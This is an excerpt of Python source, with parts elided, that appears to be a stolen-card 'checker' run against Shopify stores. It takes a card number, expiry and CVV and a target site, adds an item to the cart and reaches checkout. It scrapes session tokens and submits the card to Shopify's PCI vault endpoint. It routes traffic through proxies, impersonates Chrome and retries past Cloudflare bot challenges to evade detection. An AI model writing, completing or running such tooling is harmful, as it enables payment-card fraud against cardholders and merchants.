...
async def make_graphql_request_with_captcha_handling(
    ...
    for attempt in range(max_retries + 1):
        try:
            ...
            if "cf_chl_opt" in res_text or "just a moment" in res_text.lower():
                if attempt < max_retries:
                    await asyncio.sleep(2)
                    continue
            return response, res_text, False
        except Exception as e:
            if attempt == max_retries: return None, str(e), False
...
async def fetch_products(domain, proxy_str=None):
    try:
        ...
        resp = curl_requests.get(f"{domain}/products.json", impersonate="chrome110", timeout=10, proxies=proxies)
...
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    ...
    def curl_post(url, **kwargs):
        prox = kwargs.pop('proxy', None)
        if prox: kwargs['proxies'] = {'http': prox, 'https': prox}
        kwargs['impersonate'] = 'chrome110'
        # Remove aiohttp specific params
    ...
    try:
        ...
        if True:
            ...
            cart_resp = curl_post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy)
            ...
            if cart_resp.status_code != 200:
                ...
                cart_resp = curl_post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
            ...
            # First get to establish cookies and check redirection
            response = curl_get(url=checkout, headers=checkout_headers, proxy=proxy, allow_redirects=True)
            checkout_url = str(response.url)
            text = response.text

            # If not redirected to checkout page, try POST
            if '/checkouts/' not in checkout_url:
                response = curl_post(url=checkout, headers=checkout_headers, proxy=proxy, allow_redirects=True, cookies=response.cookies)
                checkout_url = str(response.url)
                text = response.text
            ...
            if not sst:
                # JWT search as last resort
                jwt_match = re.search(r'([a-zA-Z0-9_-]{30,}\.[a-zA-Z0-9_-]{30,}\.[a-zA-Z0-9_-]{30,})', text)
                if jwt_match: sst = jwt_match.group(1)
            ...
            response = curl_post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
            try:
